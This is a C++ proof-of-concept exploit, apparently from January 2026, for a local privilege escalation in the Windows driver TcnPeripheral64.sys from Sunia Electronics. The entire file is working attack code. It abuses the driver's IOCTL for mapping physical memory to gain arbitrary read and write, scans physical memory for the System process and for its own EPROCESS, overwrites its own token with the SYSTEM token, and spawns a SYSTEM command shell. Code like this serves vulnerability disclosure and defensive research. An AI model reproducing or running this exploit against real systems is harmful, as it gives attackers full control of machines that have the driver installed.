/*
 * TcnPeripheral64.sys Local Privilege Escalation (LPE)
 * Arbitrary Physical Memory Read/Write -> Token Stealing -> SYSTEM
 *
 * Vendor: Sunia Electronics
 * Driver: TcnPeripheral64.sys v1.0.7.2
 * SHA256: fa4e294b11e613a27722559b043637bd4d0af5603ab7e8c7970caffd96cf7247
 *
 * Author: b3s3da
 * Date: 2026-01-22
 */

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <iostream>
#include <vector>
#include <algorithm>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

// ============================================================================
// Driver interface
// ============================================================================

#define IOCTL_MAP_PHYSICAL_MEMORY 0x4002848

#pragma pack(push, 1)
struct MapRequest {
    uint64_t Size;
    uint64_t PhysicalAddress;
    uint64_t Reserved[3];
};

struct MapResponse {
    uint64_t Unknown1;
    uint64_t Unknown2;
    uint64_t SectionHandle;
    void*    MappedAddress;
    uint64_t Object;
};
#pragma pack(pop)

static HANDLE g_hDevice = INVALID_HANDLE_VALUE;

static bool OpenDriver() {
    const char* devices[] = {
        "\\\\.\\SPBTESTTOOL",
        "\\\\.\\TcnPeripheral",
        "\\\\.\\TcnPeripheral0",
    };
    for (const char* dev : devices) {
        g_hDevice = CreateFileA(dev, GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, 0, NULL);
        if (g_hDevice != INVALID_HANDLE_VALUE) {
            std::cout << "[+] Opened: " << dev << std::endl;
            return true;
        }
    }
    return false;
}

// Map physical memory into userspace via the vulnerable IOCTL.
// Returns a direct pointer — read AND write through it.
static void* MapPhysical(uint64_t physAddr, uint64_t size) {
    MapRequest req = {};
    req.PhysicalAddress = physAddr;
    req.Size = size;

    MapResponse resp = {};
    DWORD bytes = 0;

    if (DeviceIoControl(g_hDevice, IOCTL_MAP_PHYSICAL_MEMORY,
        &req, sizeof(req), &resp, sizeof(resp), &bytes, NULL)) {
        return resp.MappedAddress;
    }
    return nullptr;
}

static bool ReadPhys(uint64_t addr, void* buf, size_t size) {
    void* mapped = MapPhysical(addr, size);
    if (!mapped) return false;
    __try {
        memcpy(buf, mapped, size);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return true;
}

static bool WritePhys(uint64_t addr, void* buf, size_t size) {
    void* mapped = MapPhysical(addr, size);
    if (!mapped) return false;
    __try {
        memcpy(mapped, buf, size);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return true;
}

template<typename T>
static T ReadPhysVal(uint64_t addr) {
    T val = 0;
    ReadPhys(addr, &val, sizeof(T));
    return val;
}

template<typename T>
static bool WritePhysVal(uint64_t addr, T val) {
    return WritePhys(addr, &val, sizeof(T));
}

// ============================================================================
// EPROCESS offsets (resolved dynamically from ntoskrnl exports)
// ============================================================================

static struct {
    uint16_t UniqueProcessId    = 0x440;
    uint16_t ActiveProcessLinks = 0x448;
    uint16_t Token              = 0x4B8;
    uint16_t ImageFileName      = 0x5A8;
} g_Off;

static bool FindOffsets() {
    HMODULE hNtos = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) {
        std::cout << "[-] Failed to load ntoskrnl.exe" << std::endl;
        return false;
    }

    FARPROC pFn = GetProcAddress(hNtos, "PsGetProcessId");
    if (pFn) g_Off.UniqueProcessId = *(uint16_t*)((uint8_t*)pFn + 3);
    g_Off.ActiveProcessLinks = g_Off.UniqueProcessId + 8;

    pFn = GetProcAddress(hNtos, "PsGetProcessImageFileName");
    if (pFn) g_Off.ImageFileName = *(uint16_t*)((uint8_t*)pFn + 3);

    pFn = GetProcAddress(hNtos, "PsReferencePrimaryToken");
    if (pFn) {
        uint8_t* p = (uint8_t*)pFn;
        for (int i = 0; i < 32; i++) {
            if (p[i] == 0x48 && p[i + 1] == 0x8B) {
                if ((p[i + 2] & 0xC7) == 0x81) {
                    g_Off.Token = *(uint16_t*)&p[i + 3];
                    break;
                } else if ((p[i + 2] & 0xC7) == 0x41) {
                    g_Off.Token = p[i + 3];
                    break;
                }
            }
        }
    }

    FreeLibrary(hNtos);

    std::cout << "[+] EPROCESS offsets:" << std::endl;
    std::cout << "    UniqueProcessId    = 0x" << std::hex << g_Off.UniqueProcessId << std::endl;
    std::cout << "    ActiveProcessLinks = 0x" << g_Off.ActiveProcessLinks << std::endl;
    std::cout << "    Token              = 0x" << g_Off.Token << std::endl;
    std::cout << "    ImageFileName      = 0x" << g_Off.ImageFileName << std::endl;
    return true;
}

// ============================================================================
// Physical memory ranges (Superfetch API)
// ============================================================================

struct PhysMemRange { uint64_t Start, End; };
static std::vector<PhysMemRange> g_PhysRanges;

#define SUPERFETCH_VERSION  0x2D
#define SUPERFETCH_MAGIC    0x6B756843
#define SystemSuperfetchInfo 79

typedef enum { SuperfetchMemoryRangesQuery = 17 } SUPERFETCH_INFO_CLASS;

typedef struct {
    ULONG Version; ULONG Magic;
    SUPERFETCH_INFO_CLASS InfoClass;
    PVOID Data; ULONG Length;
} SUPERFETCH_INFORMATION;

typedef struct { ULONG_PTR BasePfn; ULONG_PTR PageCount; } PF_PHYSICAL_MEMORY_RANGE;

#pragma pack(push, 8)
typedef struct {
    ULONG Version; ULONG Flags; ULONG RangeCount;
    PF_PHYSICAL_MEMORY_RANGE Ranges[1];
} PF_MEMORY_RANGE_INFO_V2;
#pragma pack(pop)

typedef NTSTATUS(NTAPI* pNtQSI)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

static bool LoadPhysicalMemoryRanges() {
    g_PhysRanges.clear();

    auto NtQSI = (pNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    auto RtlAdj = (pRtlAdjustPrivilege)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAdjustPrivilege");
    if (!NtQSI || !RtlAdj) goto fallback;

    {
        BOOLEAN old;
        RtlAdj(13, TRUE, FALSE, &old);
        RtlAdj(20, TRUE, FALSE, &old);

        PF_MEMORY_RANGE_INFO_V2 rangeInfo = {};
        rangeInfo.Version = 2;

        SUPERFETCH_INFORMATION sfInfo = {};
        sfInfo.Version = SUPERFETCH_VERSION;
        sfInfo.Magic = SUPERFETCH_MAGIC;
        sfInfo.InfoClass = SuperfetchMemoryRangesQuery;
        sfInfo.Data = &rangeInfo;
        sfInfo.Length = sizeof(rangeInfo);

        ULONG resultLen = 0;
        NTSTATUS status = NtQSI(SystemSuperfetchInfo, &sfInfo, sizeof(sfInfo), &resultLen);

        std::vector<BYTE> buf;
        PF_MEMORY_RANGE_INFO_V2* pRanges = nullptr;

        if (status == (NTSTATUS)0xC0000023 && resultLen > 0) {
            buf.resize(resultLen);
            pRanges = (PF_MEMORY_RANGE_INFO_V2*)buf.data();
            pRanges->Version = 2;
            sfInfo.Data = pRanges;
            sfInfo.Length = resultLen;
            status = NtQSI(SystemSuperfetchInfo, &sfInfo, sizeof(sfInfo), &resultLen);
        } else if (status == 0) {
            pRanges = &rangeInfo;
        }

        if (status != 0 || !pRanges || pRanges->RangeCount == 0) goto fallback;

        for (ULONG i = 0; i < pRanges->RangeCount; i++) {
            uint64_t start = pRanges->Ranges[i].BasePfn << 12;
            uint64_t size = pRanges->Ranges[i].PageCount << 12;
            if (size > 0) g_PhysRanges.push_back({ start, start + size });
        }
    }

    if (!g_PhysRanges.empty()) {
        std::cout << "[+] Physical ranges via Superfetch" << std::endl;
        goto done;
    }

fallback:
    std::cout << "[!] Superfetch failed, using fallback" << std::endl;
    g_PhysRanges.push_back({ 0x100000, 0x80000000 });
    {
        MEMORYSTATUSEX ms = { sizeof(ms) };
        if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys > 0x100000000ULL) {
            uint64_t above = ms.ullTotalPhys - 0x80000000ULL;
            uint64_t base = 0x100000000ULL;
            while (above > 0 && base < 0x1000000000ULL) {
                uint64_t sz = min(above, (uint64_t)0x100000000ULL);
                g_PhysRanges.push_back({ base, base + sz });
                base += sz;
                above -= sz;
            }
        }
    }

done:
    std::sort(g_PhysRanges.begin(), g_PhysRanges.end(),
        [](const PhysMemRange& a, const PhysMemRange& b) { return a.Start < b.Start; });

    uint64_t totalMB = 0;
    for (const auto& r : g_PhysRanges) totalMB += (r.End - r.Start) / 1024 / 1024;
    std::cout << "[+] " << std::dec << totalMB << " MB in "
              << g_PhysRanges.size() << " ranges" << std::endl;
    return !g_PhysRanges.empty();
}

// ============================================================================
// EPROCESS scanner — brute-force physical memory for EPROCESS structures
// ============================================================================

static uint64_t FindEprocess(const char* name, DWORD targetPid = 0) {
    std::cout << "[*] Scanning for " << name;
    if (targetPid) std::cout << " (PID " << std::dec << targetPid << ")";
    std::cout << "..." << std::endl;

    const DWORD pageSize = 0x10000;
    std::vector<BYTE> buffer(pageSize);
    size_t nameLen = strlen(name);

    for (const auto& range : g_PhysRanges) {
        uint64_t start = (range.Start + 0xFFF) & ~0xFFFULL;
        uint64_t end = range.End;

        for (uint64_t addr = start; addr < end; addr += pageSize) {
            if ((addr - start) % (256 * 1024 * 1024) == 0) {
                uint64_t scannedMB = 0;
                for (const auto& r : g_PhysRanges) {
                    if (r.End <= addr) scannedMB += (r.End - r.Start) / 1024 / 1024;
                    else if (r.Start < addr) scannedMB += (addr - r.Start) / 1024 / 1024;
                }
                std::cout << "\r[*] " << std::dec << scannedMB << " MB   " << std::flush;
            }

            DWORD readSize = (DWORD)min((uint64_t)pageSize, end - addr);
            if (!ReadPhys(addr, buffer.data(), readSize)) continue;

            for (size_t i = g_Off.ImageFileName; i < readSize - 0x600; ++i) {
                if (_strnicmp((char*)&buffer[i], name, nameLen) != 0) continue;
                if (buffer[i + nameLen] != 0 && buffer[i + nameLen] != '.') continue;

                size_t base = i - g_Off.ImageFileName;
                uint64_t pid   = *(uint64_t*)&buffer[base + g_Off.UniqueProcessId];
                uint64_t flink = *(uint64_t*)&buffer[base + g_Off.ActiveProcessLinks];
                uint64_t blink = *(uint64_t*)&buffer[base + g_Off.ActiveProcessLinks + 8];

                if (pid == 0 || pid > 100000) continue;
                if ((flink & 0xFFFF000000000000) != 0xFFFF000000000000) continue;
                if ((blink & 0xFFFF000000000000) != 0xFFFF000000000000) continue;
                if (targetPid && pid != targetPid) continue;

                std::cout << "\r[+] Found @ phys 0x" << std::hex << (addr + base)
                          << " PID=" << std::dec << pid << std::endl;
                return addr + base;
            }
        }
    }
    std::cout << "\r[-] Not found" << std::endl;
    return 0;
}

// ============================================================================
// LPE — Token Stealing
// ============================================================================

static bool DoLPE() {
    std::cout << "\n=== LPE: Token Stealing ===" << std::endl;

    uint64_t systemEproc = FindEprocess("System", 4);
    if (!systemEproc) {
        std::cout << "[-] Could not find System EPROCESS" << std::endl;
        return false;
    }

    DWORD ourPid = GetCurrentProcessId();
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char* name = strrchr(path, '\\');
    name = name ? name + 1 : path;
    if (strlen(name) > 14) name[14] = 0; // EPROCESS ImageFileName is 15 bytes

    uint64_t ourEproc = FindEprocess(name, ourPid);
    if (!ourEproc) {
        std::cout << "[-] Could not find our EPROCESS" << std::endl;
        return false;
    }

    uint64_t sysToken = ReadPhysVal<uint64_t>(systemEproc + g_Off.Token);
    uint64_t ourToken = ReadPhysVal<uint64_t>(ourEproc + g_Off.Token);

    std::cout << "[*] System token: 0x" << std::hex << sysToken << std::endl;
    std::cout << "[*] Our token:    0x" << ourToken << std::endl;

    if (!WritePhysVal(ourEproc + g_Off.Token, sysToken)) {
        std::cout << "[-] Failed to write token" << std::endl;
        return false;
    }

    uint64_t newToken = ReadPhysVal<uint64_t>(ourEproc + g_Off.Token);
    if ((newToken & ~0xF) != (sysToken & ~0xF)) {
        std::cout << "[-] Token verification failed" << std::endl;
        return false;
    }

    std::cout << "[+] Token replaced successfully" << std::endl;
    std::cout << "[+] Spawning SYSTEM shell..." << std::endl;

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    return true;
}

// ============================================================================
// Entry point
// ============================================================================

int main() {
    std::cout << "\n";
    std::cout << "==============================================\n";
    std::cout << " TcnPeripheral64.sys LPE PoC\n";
    std::cout << " Vendor: Sunia Electronics\n";
    std::cout << " Author: b3s3da | 2026\n";
    std::cout << "==============================================\n\n";

    if (!OpenDriver()) {
        std::cerr << "[-] Failed to open driver. Is it installed?\n";
        system("pause");
        return 1;
    }

    if (!FindOffsets()) {
        std::cerr << "[-] Failed to resolve EPROCESS offsets\n";
        CloseHandle(g_hDevice);
        system("pause");
        return 1;
    }

    if (!LoadPhysicalMemoryRanges()) {
        std::cerr << "[-] Failed to load physical memory ranges\n";
        CloseHandle(g_hDevice);
        system("pause");
        return 1;
    }

    DoLPE();

    CloseHandle(g_hDevice);
    system("pause");
    return 0;
}
